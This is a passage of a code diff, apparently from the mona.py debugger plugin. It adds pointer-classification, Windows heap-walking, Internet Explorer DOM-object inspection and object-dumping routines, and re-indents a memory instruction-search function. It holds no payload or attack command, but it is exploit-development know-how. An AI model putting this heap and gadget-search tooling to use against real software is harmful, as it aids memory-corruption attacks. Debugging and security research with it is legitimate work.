+		return outstring
+
+	def getAddress(self):
+		return self.address
+	
+	def isUnicode(self):
+		return self.isUnicode
+		
+	def isUnicodeRev(self):
+		return self.isUnicodeRev		
+	
+	def isUnicodeTransform(self):
+		return self.unicodeTransform != ""
+	
+	def isAscii(self):
+		return self.isAscii
+	
+	def isAsciiPrintable(self):
+		return self.isAsciiPrintable
+	
+	def isUppercase(self):
+		return self.isUppercase
+	
+	def isLowercase(self):
+		return self.isLowercase
+		
+	def isUpperNum(self):
+		return self.isUpperNum
+		
+	def isLowerNum(self):
+		return self.isLowerNum
+		
+	def isNumeric(self):
+		return self.isNumeric
+		
+	def isAlphaNumeric(self):
+		return self.alphaNumeric
+	
+	def hasNulls(self):
+		return self.hasNulls
+	
+	def startsWithNull(self):
+		return self.startsWithNull
+		
+	def belongsTo(self):
+		"""
+		Retrieves the module a given pointer belongs to
+
+		Arguments:
+		None
+
+		Return:
+		String with the name of the module a pointer belongs to,
+		or empty if pointer does not belong to a module
+		"""		
+		if len(g_modules)==0:
+			populateModuleInfo()
+		for thismodule,modproperties in g_modules.iteritems():
+				thisbase = getModuleProperty(thismodule,"base")
+				thistop = getModuleProperty(thismodule,"top")
+				if (self.address >= thisbase) and (self.address <= thistop):
+					return thismodule
+		return ""
+	
+	def isOnStack(self):
+		"""
+		Checks if the pointer is on one of the stacks of one of the threads in the process
+
+		Arguments:
+		None
+
+		Return:
+		Boolean - True if pointer is on stack
+		"""	
+		stacks = getStacks()
+		for stack in stacks:
+			if (stacks[stack][0] <= self.address) and (self.address < stacks[stack][1]):
+				return True
+		return False
+	
+	def isInHeap(self):
+		"""
+		Checks if the pointer is part of one of the pages associated with process heaps/segments
+
+		Arguments:
+		None
+
+		Return:
+		Boolean - True if pointer is in heap
+		"""	
+		segmentcnt = 0
+
+		for heap in dbg.getHeapsAddress():
+				# part of a segment ?
+				segments = getSegmentsForHeap(heap)
+				for segment in segments:
+					if segmentcnt == 0:
+						# in heap data structure
+						if self.address >= heap and self.address <= segment:
+							return True
+						segmentcnt += 1
+					if self.address >= segment:
+						last = segments[segment][3]
+						if self.address >= segment and self.address <= last:
+							return True
+		# maybe it's in a VA List ?
+		for heap in dbg.getHeapsAddress():
+			mHeap = MnHeap(heap)
+			valist = mHeap.getVirtualAllocdBlocks()
+			if len(valist) > 0:
+				for vachunk in valist:
+					thischunk = valist[vachunk]
+					#dbg.log("self: 0x%08x, vachunk: 0x%08x, commitsize: 0x%08x, vachunk+(thischunk.commitsize)*8: 0x%08x" % (self.address,vachunk,thischunk.commitsize,vachunk+(thischunk.commitsize*8)))
+					if self.address >= vachunk and self.address <= (vachunk+(thischunk.commitsize*heapgranularity)):
+						return True
+		return False
+		
+
+	def getHeapInfo(self):
+		global silent
+		oldsilent = silent
+		silent = True
+		foundinheap, foundinsegment, foundinva, foundinchunk = self.showHeapBlockInfo()
+		silent = oldsilent
+		return [foundinheap, foundinsegment, foundinva, foundinchunk]
+
+	def getHeapInfo_old(self):
+		"""
+		Returns heap related information about a given pointer
+		"""
+		heapinfo = {}
+		heapinfo["heap"] = 0
+		heapinfo["segment"] = 0
+		heapinfo["chunk"] = 0
+		heapinfo["size"] = 0
+		allheaps = dbg.getHeapsAddress()
+		for heap in allheaps:
+			dbg.log("checking heap 0x%08x for 0x%08x" % (heap,self.address))
+			theap = dbg.getHeap(heap)
+			heapchunks = theap.getChunks(heap)
+			if len(heapchunks) > 0 and not silent:
+				dbg.log("Querying segment(s) for heap 0x%s" % toHex(heap))
+			for hchunk in heapchunks:
+				chunkbase = hchunk.get("address")
+				chunksize = hchunk.get("size")
+				if self.address >= chunkbase and self.address <= (chunkbase+chunksize):
+					heapinfo["heap"] = heap
+					heapinfo["segment"] = 0
+					heapinfo["chunk"] = chunkbase
+					heapinfo["size"] = chunksize
+					return heapinfo
+		return heapinfo
+
+
+	def showObjectInfo(self):
+		# check if chunk is a DOM object
+		if __DEBUGGERAPP__ == "WinDBG":
+			cmdtorun = "dds 0x%08x L 1" % self.address
+			output = dbg.nativeCommand(cmdtorun)
+			outputlower = output.lower()
+			outputlines = output.split("\n")
+			if "vftable" in outputlower:
+				# is this Internet Explorer ?
+				ieversion = 0
+				if isModuleLoadedInProcess('iexplore.exe') and isModuleLoadedInProcess('mshtml.dll'):
+					ieversionstr = getModuleProperty('iexplore.exe','version')
+					dbg.log("      Internet Explorer v%s detected" % ieversionstr)
+					ieversion = 0
+					if ieversionstr.startswith("8."):
+						ieversion = 8
+					if ieversionstr.startswith("9."):
+						ieversion = 9
+					if ieversionstr.startswith("10."):
+						ieversion = 10
+				dbg.log("      0x%08x may be the start of an object, vtable pointer: %s" % (self.address,outputlines[0]))
+				vtableptr_s = outputlines[0][10:18]
+				try:
+					vtableptr = hexStrToInt(vtableptr_s)
+					dbg.log("      Start of vtable at 0x%08x: (showing first 4 entries only)" % vtableptr)
+					cmdtorun = "dds 0x%08x L 4" % vtableptr
+					output = dbg.nativeCommand(cmdtorun)
+					outputlines = output.split("\n")
+					cnt = 0
+					for line in outputlines:
+						if line.replace(" ","") != "":
+							dbg.log("       +0x%x -> %s" % (cnt,line))
+						cnt += 4
+					if "mshtml!" in outputlower and ieversion > 7:
+						# see if we can find the object type, refcounter, attribute count, parent, etc
+						refcounter = None
+						attributeptr = None
+						try:
+							refcounter = dbg.readLong(self.address + 4)
+						except:
+							pass
+						try:
+							if ieversion == 8:
+								attributeptr = dbg.readLong(self.address + 0xc)
+							if ieversion == 9:
+								attributeptr = dbg.readLong(self.address + 0x10)
+						except:
+							pass
+						if not refcounter is None and not attributeptr is None:
+							dbg.log("      Refcounter: 0x%x (%d)" % (refcounter,refcounter))
+							if refcounter > 0x20000:
+								dbg.log("      Note: a huge refcounter value may indicate this is not a real DOM object")
+							if attributeptr == 0:
+								dbg.log("      No attributes found")
+							else:
+								ptrx = MnPointer(attributeptr)
+								if ptrx.isInHeap():
+									dbg.log("      Attribute info structure stored at 0x%08x" % attributeptr)
+									offset_nr = 0x4
+									nr_multiplier = 4
+									offset_tableptr = 0xc
+									offset_tabledata = 0
+									variant_offset = 4
+									attname_offset = 8
+									attvalue_offset = 0xc
+									if ieversion == 9:
+										nr_multiplier = 1
+										offset_nr = 0x4
+										offset_tableptr = 0x8
+										offset_tabledata = 4
+										variant_offset = 1
+										attname_offset = 4
+										attvalue_offset = 8
+
+									nr_attributes = dbg.readLong(attributeptr + offset_nr) / nr_multiplier
+									attributetableptr = dbg.readLong(attributeptr + offset_tableptr)
+									dbg.log("        +0x%02x : Nr of attributes: %d" % (offset_nr,nr_attributes))
+									dbg.log("        +0x%02x : Attribute table at 0x%08x" % (offset_tableptr,attributetableptr))
+									
+									attcnt = 0
+									while attcnt < nr_attributes:
+										
+										try:
+											dbg.log("                Attribute %d (at 0x%08x) :" % (attcnt+1,attributetableptr))
+											sec_dword = "%08x" % struct.unpack('<L',dbg.readMemory(attributetableptr+4,4))[0]
+											variant_type = int(sec_dword[0:2][:-1],16)
+											dbg.log("                  Variant Type : 0x%02x (%s)" % (variant_type,getVariantType(variant_type)))
+											if variant_type > 0x1:
+												att_name = "<n.a.>"
+												try:
+													att_name_ptr = dbg.readLong(attributetableptr+attname_offset)
+													att_name_ptr_value = dbg.readLong(att_name_ptr+4)
+													att_name = dbg.readWString(att_name_ptr_value)
+												except:
+													att_name = "<n.a.>"
+												dbg.log("                  0x%08x + 0x%02x (0x%08x): 0x%08x : &Attribute name : '%s'" % (attributetableptr,attname_offset,attributetableptr+attname_offset,att_name_ptr,att_name))
+												att_value_ptr = dbg.readLong(attributetableptr+attvalue_offset)
+												ptrx = MnPointer(att_value_ptr)
+												if ptrx.isInHeap():
+													att_value = ""
+													if variant_type == 0x8:
+														att_value = dbg.readWString(att_value_ptr)
+													if variant_type == 0x16:
+														attv = dbg.readLong(att_value_ptr)
+														att_value = "0x%08x (%s)" % (attv,int("0x%08x" % attv,16))
+													if variant_type == 0x1e:
+														att_from = dbg.readLong(att_value_ptr)
+														att_value = dbg.readString(att_from)
+													if variant_type == 0x1f:
+														att_from = dbg.readLong(att_value_ptr)
+														att_value = dbg.readWString(att_from)
+												else:
+													att_value = "0x%08x (%s)" % (att_value_ptr,int("0x%08x" % att_value_ptr,16))
+												dbg.log("                  0x%08x + 0x%02x (0x%08x): 0x%08x : &Value : %s" % (attributetableptr,attvalue_offset,attributetableptr+attvalue_offset,att_value_ptr,att_value))
+										except:
+											dbg.logLines(traceback.format_exc(),highlight=True)
+											break
+										attributetableptr += 0x10 											
+										attcnt += 1
+								else:
+									dbg.log("      Invalid attribute ptr found (0x%08x). This may not be a real DOM object." % attributeptr)
+
+
+						offset_domtree = 0x14
+						if ieversion == 9:
+							offset_domtree = 0x1C
+						domtreeptr = dbg.readLong(self.address + offset_domtree)
+						if not domtreeptr is None:
+							dptrx = MnPointer(domtreeptr)
+							if dptrx.isInHeap():
+								currobj = self.address
+								moreparents = True
+								parentcnt = 0
+								dbg.log("      Object +0x%02x : Ptr to DOM Tree info: 0x%08x" % (offset_domtree,domtreeptr))								
+								while moreparents:
+									# walk tree, get parents
+									parentspaces = " " * parentcnt
+									cmdtorun = "dds poi(poi(poi(0x%08x+0x%02x)+4)) L 1" % (currobj,offset_domtree)
+									output = dbg.nativeCommand(cmdtorun)
+									outputlower = output.lower()
+									outputlines = output.split("\n")
+									if "vftable" in outputlines[0]:
+										dbg.log("      %s Parent : %s" % (parentspaces,outputlines[0]))
+										parts = outputlines[0].split(" ")
+										try:
+											currobj = int(parts[0],16)
+										except:
+											currobj = 0
+									else:
+										moreparents = False
+									parentcnt += 3
+									if currobj == 0:
+										moreparents = False
+
+				except:
+					dbg.logLines(traceback.format_exc(),highlight=True)
+					pass
+
+		return
+
+
+
+	def showHeapBlockInfo(self):
+		"""
+		Find address in heap and print out info about heap, segment, chunk it belongs to
+		"""
+		allheaps = []
+		heapkey = 0
+		
+		foundinheap = None
+		foundinsegment = None
+		foundinva = None
+		foundinchunk = None
+		dumpsize = 0
+		dodump = False
+
+		try:
+			allheaps = dbg.getHeapsAddress()
+		except:
+			allheaps = []
+		for heapbase in allheaps:
+			mHeap = MnHeap(heapbase)
+			heapbase_extra = ""
+			frontendinfo = []
+			frontendheapptr = 0
+			frontendheaptype = 0
+			if win7mode:
+				heapkey = mHeap.getEncodingKey()
+				if mHeap.usesLFH():
+					frontendheaptype = 0x2
+					heapbase_extra = " [LFH] "
+					frontendheapptr = mHeap.getLFHAddress()
+			frontendinfo = [frontendheaptype,frontendheapptr]
+
+			segments = mHeap.getHeapSegmentList()
+
+			#segments
+			for seg in segments:
+				segstart = segments[seg][0]
+				segend = segments[seg][1]
+				FirstEntry = segments[seg][2]
+				LastValidEntry = segments[seg][3]								
+				allchunks = walkSegment(FirstEntry,LastValidEntry,heapbase)
+				for chunkptr in allchunks:
+					thischunk = allchunks[chunkptr]
+					thissize = thischunk.size*8 
+					headersize = thischunk.headersize
+					if self.address >= chunkptr and self.address < (chunkptr + thissize):
+						# found it !
+						if not silent:
+							dbg.log("")
+							dbg.log("Address 0x%08x found in " % self.address)
+							thischunk.showChunk(showdata = True)
+							self.showObjectInfo()
+							self.showHeapStackTrace(thischunk)
+							dodump = True
+							dumpsize = thissize
+						foundinchunk = thischunk
+						foundinsegment = seg
+						foundinheap = heapbase
+						break
+				if not foundinchunk == None:
+					break
+
+			# VA
+			if foundinchunk == None:
+				# maybe it's in VirtualAllocdBlocks
+				vachunks = mHeap.getVirtualAllocdBlocks()
+				for vaptr in vachunks:
+					thischunk = vachunks[vaptr]
+					if self.address >= vaptr and self.address <= vaptr + (thischunk.commitsize*8):
+						if not silent:
+							dbg.log("")
+							dbg.log("Address 0x%08x found in VirtualAllocdBlocks of heap 0x%08x" % (self.address,heapbase))
+							thischunk.showChunk(showdata = True)
+							self.showObjectInfo()
+							self.showHeapStackTrace(thischunk)
+							thissize = thischunk.usersize
+							dumpsize = thissize
+							dodump = True					
+						foundinchunk = thischunk
+						foundinva = vaptr
+						foundinheap = heapbase
+						break
+
+			# perhaps chunk is in FEA
+			# if it is, it won't be a VA chunk
+			if foundinva == None:
+				if not win7mode:
+					foundinlal = False
+					foundinfreelist = False
+					FrontEndHeap = mHeap.getFrontEndHeap()
+					if FrontEndHeap > 0:
+						fea_lal = mHeap.getLookAsideList()
+						for lal_table_entry in sorted(fea_lal.keys()):
+							nr_of_chunks = len(fea_lal[lal_table_entry])
+							lalhead = struct.unpack('<L',dbg.readMemory(FrontEndHeap + (0x30 * lal_table_entry),4))[0]
+							for chunkindex in fea_lal[lal_table_entry]:
+								lalchunk = fea_lal[lal_table_entry][chunkindex]
+								chunksize = lalchunk.size * 8
+								flag = getHeapFlag(lalchunk.flag)
+								if (self.address >= lalchunk.chunkptr) and (self.address < lalchunk.chunkptr+chunksize):
+									foundinlal = True
+									if not silent:
+										dbg.log("Address is part of chunk on LookAsideList[%d], heap 0x%08x" % (lal_table_entry,mHeap.heapbase))
+									break
+							if foundinlal:
+								expectedsize = lal_table_entry * 8
+								if not silent:
+									dbg.log("     LAL [%d] @0x%08x, Expected Chunksize: 0x%x (%d), %d chunks, Flink: 0x%08x" % (lal_table_entry,FrontEndHeap + (0x30 * lal_table_entry),expectedsize,expectedsize,nr_of_chunks,lalhead))
+								for chunkindex in fea_lal[lal_table_entry]:
+									lalchunk = fea_lal[lal_table_entry][chunkindex]
+									foundchunk = lalchunk
+									chunksize = lalchunk.size * 8
+									flag = getHeapFlag(lalchunk.flag)
+									extra = "       "
+									if (self.address >= lalchunk.chunkptr) and (self.address < lalchunk.chunkptr+chunksize):
+										extra = "   --> "
+									if not silent:
+										dbg.log("%sChunkPtr: 0x%08x, UserPtr: 0x%08x, Flink: 0x%08x, ChunkSize: 0x%x, UserSize: 0x%x, UserSpace: 0x%x (%s)" % (extra,lalchunk.chunkptr,lalchunk.userptr,lalchunk.flink,chunksize,lalchunk.usersize,lalchunk.usersize + lalchunk.remaining,flag))
+								if not silent:
+									self.showObjectInfo()
+									dumpsize = chunksize
+									dodump = True
+								break
+
+					if not foundinlal:
+						# or maybe in BEA
+						thisfreelist = mHeap.getFreeList()
+						thisfreelistinusebitmap = mHeap.getFreeListInUseBitmap()				
+						for flindex in thisfreelist:
+							freelist_addy = heapbase + 0x178 + (8 * flindex)
+							expectedsize = ">1016"
+							expectedsize2 = ">0x%x" % 1016
+							if flindex != 0:
+								expectedsize2 = str(8 * flindex)
+								expectedsize = "0x%x" % (8 * flindex)
+							for flentry in thisfreelist[flindex]:
+								freelist_chunk = thisfreelist[flindex][flentry]
+								chunksize = freelist_chunk.size * 8
+								if (self.address >= freelist_chunk.chunkptr) and (self.address < freelist_chunk.chunkptr+chunksize):
+									foundinfreelist = True
+									if not silent:
+										dbg.log("Address is part of chunk on FreeLists[%d] at 0x%08x, heap 0x%08x:" % (flindex,freelist_addy,mHeap.heapbase))
+									break
+							if foundinfreelist:
+								flindicator = 0
+								for flentry in thisfreelist[flindex]:
+									freelist_chunk = thisfreelist[flindex][flentry]
+									chunksize = freelist_chunk.size * 8	
+									extra = "     "
+									if (self.address >= freelist_chunk.chunkptr) and (self.address < freelist_chunk.chunkptr+chunksize):						
+										extra = " --> "
+										foundchunk = freelist_chunk
+									if not silent:
+										dbg.log("%sChunkPtr: 0x%08x, UserPtr: 0x%08x, Flink: 0x%08x, Blink: 0x%08x, ChunkSize: 0x%x (%d), Usersize: 0x%x (%d)" % (extra,freelist_chunk.chunkptr,freelist_chunk.userptr,freelist_chunk.flink,freelist_chunk.blink,chunksize,chunksize,freelist_chunk.usersize,freelist_chunk.usersize))
+									if flindex != 0 and chunksize != (8*flindex):
+										dbg.log("     ** Header may be corrupted! **", highlight = True)
+									flindicator = 1
+								if flindex > 1 and int(thisfreelistinusebitmap[flindex]) != flindicator:
+									if not silent:
+										dbg.log("     ** FreeListsInUseBitmap mismatch for index %d! **" % flindex, highlight = True)
+								if not silent:
+									self.showObjectInfo()
+									dumpsize = chunksize
+									dodump = True
+								break		
+
+		if dodump and dumpsize > 0 and dumpsize < 1025 and not silent:
+			self.dumpObjectAtLocation(dumpsize)	
+
+		return foundinheap, foundinsegment, foundinva, foundinchunk
+
+	def showHeapStackTrace(self,thischunk):
+		# show stacktrace if any
+		if __DEBUGGERAPP__ == "WinDBG": 
+			stacktrace_address = thischunk.dph_block_information_stacktrace
+			stacktrace_index = thischunk.dph_block_information_traceindex
+			stacktrace_startstamp = 0xabcdaaaa
+			if thischunk.hasust and stacktrace_address > 0:
+				if stacktrace_startstamp == thischunk.dph_block_information_startstamp:
+					cmd2run = "dds 0x%08x L 24" % (stacktrace_address)
+					output = dbg.nativeCommand(cmd2run)
+					outputlines = output.split("\n")
+					if "!" in output:
+						dbg.log("Stack trace, index 0x%x:" % stacktrace_index)
+						dbg.log("--------------------------")
+						for outputline in outputlines:
+							if "!" in outputline:
+								lineparts = outputline.split(" ")
+								if len(lineparts) > 2:
+									firstpart = len(lineparts[0])+1
+									dbg.log(outputline[firstpart:])
+		return
+	
+	def memLocation(self):
+		"""
+		Gets the memory location associated with a given pointer (modulename, stack, heap or empty)
+		
+		Arguments:
+		None
+		
+		Return:
+		String
+		"""
+
+		memloc = self.belongsTo()
+		
+		if memloc == "":
+			if self.isOnStack():
+				return "Stack"
+			if self.isInHeap():
+				return "Heap"
+			return "??"
+		return memloc
+
+	def getPtrFunction(self):
+		funcinfo = ""
+		global silent
+		silent = True
+		if __DEBUGGERAPP__ == "WinDBG":
+			lncmd = "ln 0x%08x" % self.address
+			lnoutput = dbg.nativeCommand(lncmd)
+			for line in lnoutput.split("\n"):
+				if line.replace(" ","") != "" and line.find("%08x" % self.address) > -1:
+					lineparts = line.split("|")
+					funcrefparts = lineparts[0].split(")")
+					if len(funcrefparts) > 1:
+						funcinfo = funcrefparts[1].replace(" ","")
+						break
+
+		if funcinfo == "":
+			memloc = self.belongsTo()
+			if not memloc == "":
+				mod = MnModule(memloc)
+				if not mod is None:
+					start = mod.moduleBase
+					offset = self.address - start
+					offsettxt = ""
+					if offset > 0:
+						offsettxt = "+0x%08x" % offset
+					else:
+						offsettxt = "__base__"
+					funcinfo = memloc+offsettxt
+		silent = False
+		return funcinfo
+
+	def dumpObjectAtLocation(self,size,levels=0,nestedsize=0,customthislog="",customlogfile=""):
+		dumpdata = {}
+		origdumpdata = {} 
+		if __DEBUGGERAPP__ == "WinDBG":
+			addy = self.address
+			if not silent:
+				dbg.log("")
+				dbg.log("----------------------------------------------------")
+				if (size < 0x500):
+					dbg.log("[+] Dumping object at 0x%08x, 0x%02x bytes" % (addy,size))
+				else:
+					dbg.log("[+] Dumping object at 0x%08x, 0x%02x bytes (output below will be limited to the first 0x500 bytes !)" % (addy,size))
+					size = 0x500
+				if levels > 0:
+					dbg.log("[+] Also dumping up to %d levels deep, max size of nested objects: 0x%02x bytes" % (levels, nestedsize))
+				dbg.log("")
+
+			parentlist = []
+			levelcnt = 0
+			if customthislog == "" and customlogfile == "":
+				logfile = MnLog("dumpobj.txt")
+				thislog = logfile.reset()
+			else:
+				logfile = customlogfile
+				thislog = customthislog
+			addys = [addy]
+			parent = ""
+			parentdata = {}
+			while levelcnt <= levels:
+				thisleveladdys = []
+				for addy in addys:
+					cmdtorun = "dps 0x%08x L 0x%02x/%x" % (addy,size,archValue(4,8))
+					startaddy = addy
+					endaddy = addy + size
+					output = dbg.nativeCommand(cmdtorun)
+					outputlines = output.split("\n")
+					offset = 0
+					for outputline in outputlines:
+						if not outputline.replace(" ","") == "":
+							loc = outputline[0:archValue(8,17)].replace("`","")
+							content = outputline[archValue(10,19):archValue(18,36)].replace("`","")
+							symbol = outputline[archValue(19,37):]
+							if not "??" in content and symbol.replace(" ","") == "":
+								contentaddy = hexStrToInt(content)
+								info = self.getLocInfo(hexStrToInt(loc),contentaddy,startaddy,endaddy)
+								info.append(content)
+								dumpdata[hexStrToInt(loc)] = info
+							else:
+								info = ["",symbol,"",content]
+								dumpdata[hexStrToInt(loc)] = info
+					if addy in parentdata:
+						pdata = parentdata[addy]
+						parent = "Referenced at 0x%08x (object 0x%08x, offset +0x%02x)" % (pdata[0],pdata[1],pdata[0]-pdata[1])
+					else:
+						parent = ""
+					
+					cmd2torun = "!heap -p -a 0x%08x" % (addy)
+					output2 = dbg.nativeCommand(cmd2torun)
+					heapdata = output2.split("\n")
+					
+					self.printObjDump(dumpdata,logfile,thislog,size,parent,heapdata)
+
+					for loc in dumpdata:
+						thisdata = dumpdata[loc]
+						if thisdata[0] == "ptr_obj":
+							thisptr = int(thisdata[3],16)
+							thisleveladdys.append(thisptr)
+							parentdata[thisptr] = [loc,addy]
+					if levelcnt == 0:
+						origdumpdata = dumpdata
+					dumpdata = {}
+				addys = thisleveladdys
+				size = nestedsize
+				levelcnt += 1
+		dumpdata = origdumpdata
+		return dumpdata
+
+
+	def printObjDump(self,dumpdata,logfile,thislog,size=0,parent="",heapdata=[]):
+		# dictionary, key = address
+		# 0 = type
+		# 1 = content info
+		# 2 = string type
+		# 3 = content
+		sortedkeys = sorted(dumpdata)
+		if len(sortedkeys) > 0:
+			startaddy = sortedkeys[0]
+			sizem = ""
+			parentinfo = ""
+			if size > 0:
+				sizem = " (0x%02x bytes)" % size
+			logfile.write("",thislog)
+
+			if parent == "":
+				logfile.write("=" * 60,thislog)
+
+			line = ">> Object at 0x%08x%s:" % (startaddy,sizem)
+			if not silent:
+				dbg.log("")
+				dbg.log(line)
+			
+			logfile.write(line,thislog)
+
+			if parent != "":
+				line = "   %s" % parent
+				if not silent:
+					dbg.log(line)
+				logfile.write(line,thislog)
+
+			line = "Offset  Address      Contents    Info"
+			if arch == 64:
+				line = "Offset  Address          Contents            Info"
+			logfile.write(line,thislog)
+			if not silent:
+				dbg.log(line)
+			line = "------  -------      --------    -----"
+			if arch == 64:
+				line = "------  -------          --------            -----"
+			logfile.write(line,thislog)
+			if not silent:
+				dbg.log(line)
+
+			offset = 0
+			
+			for loc in sortedkeys:
+				info = dumpdata[loc]
+				if len(info) > 1:
+					content = ""
+					if len(info) > 3:
+						content = info[3]
+					contentinfo = toAsciiOnly(info[1])
+					offsetstr = toSize("%02x" % offset,4)
+					line = "+%s   0x%08x | 0x%s  %s" % (offsetstr,loc,content,contentinfo)
+					if not silent:
+						dbg.log(line)
+					logfile.write(line,thislog)
+					offset += archValue(4,8)
+			if len(sortedkeys) > 0:
+				dbg.log("")
+			
+			for heapdataline in heapdata:
+				logfile.write(heapdataline, thislog)
+				dbg.log(heapdataline)
+		return
+
+	def getLocInfo(self,loc,addy,startaddy,endaddy):
+		locinfo = []
+		
+		if addy >= startaddy and addy <= endaddy:
+			offset = addy - startaddy
+			locinfo = ["self","ptr to self+0x%08x" % offset,""]
+			return locinfo
+			
+		ismapped = False
+
+		extra = ""
+		ptrx = MnPointer(addy)
+
+		memloc = ptrx.memLocation()
+		if not "??" in memloc:
+			if "Stack" in memloc or "Heap" in memloc:
+				extra = "(%s) " % memloc
+			else:
+				detailmemloc = ptrx.getPtrFunction()
+				extra = " (%s.%s)" % (memloc,detailmemloc)
+
+		# maybe it's a pointer to an object ?
+		cmd2run = "dps 0x%08x L 1" % addy
+		output = dbg.nativeCommand(cmd2run)
+		outputlines = output.split("\n")
+		if len(outputlines) > 0:
+			if not "??" in outputlines[0]:
+				ismapped = True
+				ptraddy = outputlines[0][archValue(10,19):archValue(18,36)].replace("`","")
+				ptrinfo = outputlines[0][archValue(19,37):]
+				if ptrinfo.replace(" ","") != "":
+					if "vftable" in ptrinfo or "Heap" in memloc:
+						locinfo = ["ptr_obj","%sptr to 0x%08x : %s" % (extra,hexStrToInt(ptraddy),ptrinfo),str(addy)]
+					else:
+						locinfo = ["ptr","%sptr to 0x%08x : %s" % (extra,hexStrToInt(ptraddy),ptrinfo),str(addy)]
+					return locinfo
+
+		if ismapped:
+
+			# pointer to a string ?
+			try:
+				strdata = dbg.readString(addy)
+				if len(strdata) > 2:
+					datastr = strdata
+					if len(strdata) > 80:
+						datastr = strdata[0:80] + "..."
+					locinfo = ["ptr_str","%sptr to ASCII (0x%02x) '%s'" % (extra,len(strdata),datastr),"ascii"]
+					return locinfo
+			except:
+				pass
+
+			# maybe it's unicode ?
+			try:
+				strdata = dbg.readWString(addy)
+				if len(strdata) > 2:
+					datastr = strdata
+					if len(strdata) > 80:
+						datastr = strdata[0:80] + "..."
+					locinfo = ["ptr_str","%sptr to UNICODE (0x%02x) '%s'" % (extra,len(strdata),datastr),"unicode"]
+					return locinfo
+			except:
+				pass
+
+			# maybe the pointer points into a function ?
+			ptrf = ptrx.getPtrFunction()
+			if not ptrf == "":
+				locinfo = ["ptr_func","%sptr to %s" % (extra,ptrf),str(addy)]
+				return locinfo
+
+
+			# BSTR Unicode ?
+			try:
+				bstr = struct.unpack('<L',dbg.readMemory(addy,4))[0]
+				strdata = dbg.readWString(addy+4)
+				if len(strdata) > 2 and (bstr == len(strdata)+1):
+					datastr = strdata
+					if len(strdata) > 80:
+						datastr = strdata[0:80] + "..."
+					locinfo = ["ptr_str","%sptr to BSTR UNICODE (0x%02x) '%s'" % (extra,bstr,datastr),"unicode"]
+					return locinfo
+			except:
+				pass
+
+
+			# pointer to a BSTR ASCII?
+			try:
+				strdata = dbg.readString(addy+4)
+				if len(strdata) > 2 and (bstr == len(strdata)/2):
+					datastr = strdata
+					if len(strdata) > 80:
+						datastr = strdata[0:80] + "..."
+					locinfo = ["ptr_str","%sptr to BSTR ASCII (0x%02x) '%s'" % (extra,bstr,datastr),"ascii"]
+					return locinfo
+			except:
+				pass
+
+
+
+		# pointer itself is a string ?
+		
+		if ptrx.isUnicode:
+			b1,b2,b3,b4,b5,b6,b7,b8 = (0,)*8
+			if arch == 32:
+				b1,b2,b3,b4 = splitAddress(addy)
+			if arch == 64:
+				b1,b2,b3,b4,b5,b6,b7,b8 = splitAddress(addy)
+			ptrstr = toAscii(toHexByte(b2)) + toAscii(toHexByte(b4))
+			if arch == 64:
+				ptrstr += toAscii(toHexByte(b6)) + toAscii(toHexByte(b8))
+			if ptrstr.replace(" ","") != "" and not toHexByte(b2) == "00":
+				locinfo = ["str","= UNICODE '%s' %s" % (ptrstr,extra),"unicode"]
+				return locinfo
+
+		
+		if ptrx.isAsciiPrintable:
+			b1,b2,b3,b4,b5,b6,b7,b8 = (0,)*8
+			if arch == 32:
+				b1,b2,b3,b4 = splitAddress(addy)
+			if arch == 64:
+				b1,b2,b3,b4,b5,b6,b7,b8 = splitAddress(addy)
+			ptrstr = toAscii(toHexByte(b1)) + toAscii(toHexByte(b2)) + toAscii(toHexByte(b3)) + toAscii(toHexByte(b4))
+			if arch == 64:
+				ptrstr += toAscii(toHexByte(b5)) + toAscii(toHexByte(b6)) + toAscii(toHexByte(b7)) + toAscii(toHexByte(b8))
+			if ptrstr.replace(" ","") != "" and not toHexByte(b1) == "00" and not toHexByte(b2) == "00" and not toHexByte(b3) == "00" and not toHexByte(b4) == "00":
+				if arch != 64 or (not toHexByte(b5) == "00" and not toHexByte(b6) == "00" and not toHexByte(b7) == "00" and not toHexByte(b8) == "00"):
+					locinfo = ["str","= ASCII '%s' %s" % (ptrstr,extra),"ascii"]
+					return locinfo
+
+		# pointer to heap ?
+		if "Heap" in memloc:
+			if not "??" in outputlines[0]:
+				ismapped = True
+				ptraddy = outputlines[0][archValue(10,19):archValue(18,36)]
+				locinfo = ["ptr_obj","%sptr to 0x%08x" % (extra,hexStrToInt(ptraddy)),str(addy)]
+				return locinfo
+
+		# nothing special to report
+		return ["","",""]
+
+
+		
 #---------------------------------------#
 #  Various functions                    #
 #---------------------------------------#
@@ -5177,36 +5242,36 @@ def searchInRange(sequences, start=0, end=TOP_USERLAND,criteria=[]):
                         dbg.log("      !Skipped search of range %08x-%08x (Doesn't start with null)" % (page_start,page_end))
                     continue
 
-                mem = dbg.MemoryPages[a].getMemory()
-                if not mem:
-                    continue
-                
-                # loop on each sequence
-                for seq in sequences:
-                    if (ptr_to_get < 0) or (ptr_to_get > 0 and ptr_counter < ptr_to_get):
-                        buf = None
-                        human_format = ""
-                        if type(seq) == str:
-                            human_format = seq.replace("\n"," # ")
-                            buf = dbg.assemble(seq)
-                        else:
-                            human_format = seq[0].replace("\n"," # ")
-                            buf = seq[1]
-                        
-                        recur_find   = []       
-                        try:
-                            buf_len      = len(buf)
-                            mem_list     = mem.split( buf )
-                            total_length = buf_len * -1
-                        except:
-                            process_error_found = True
-                            dbg.log(" ** Unable to process searchPattern '%s'. **" % human_format)
-                            break
-                        
-                        for i in mem_list:
-                            total_length = total_length + len(i) + buf_len
-                            seq_address = a + total_length
-                            recur_find.append( seq_address )
+				mem = dbg.MemoryPages[a].getMemory()
+				if not mem:
+					continue
+				
+				# loop on each sequence
+				for seq in sequences:
+					if (ptr_to_get < 0) or (ptr_to_get > 0 and ptr_counter < ptr_to_get):
+						buf = None
+						human_format = ""
+						if type(seq) == str:
+							human_format = seq.replace("\n"," # ")
+							buf = dbg.assemble(seq)
+						else:
+							human_format = seq[0].replace("\n"," # ")
+							buf = seq[1]
+
+						recur_find   = []		
+						try:
+							buf_len      = len(buf)
+							mem_list     = mem.split( buf )
+							total_length = buf_len * -1
+						except:
+							process_error_found = True
+							dbg.log(" ** Unable to process searchPattern '%s'. **" % human_format)
+							break
+						
+						for i in mem_list:
+							total_length = total_length + len(i) + buf_len
+							seq_address = a + total_length
+							recur_find.append( seq_address )
 
                         #The last one is the remaining slice from the split
                         #so remove it from the list
@@ -5314,304 +5379,315 @@ def isModuleLoadedInProcess(modulename):
     
 
 def UnicodeTransformInfo(hexaddr):
-    """
-    checks if the address can be used as unicode ansi transform
-    
-    Arguments:
-    hexaddr  - a string containing the address in hex format (4 bytes - 8 characters)
-    
-    Return:
